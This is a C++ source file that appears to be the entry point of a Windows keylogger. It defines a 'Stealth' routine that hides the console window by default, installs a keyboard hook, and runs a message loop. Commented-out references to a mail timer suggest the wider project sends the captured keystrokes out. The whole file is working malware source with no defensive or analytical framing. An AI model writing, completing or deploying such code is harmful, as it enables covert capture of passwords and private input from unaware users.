#include <iostream>

#include "KeybHook.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"

// defines whether the window is visible or not
// should be solved with makefile, not in this file
// Using this option is opening and closing a command prompt in quick succession.
// Technically there is no window, but you see something happening as if a process has been started.
#define invisible // (visible / invisible)


void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}


int main()
{

    Stealth();

    MSG Msg;
 //   IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while (GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

//    MailTimer.Stop();
    return 0;
}

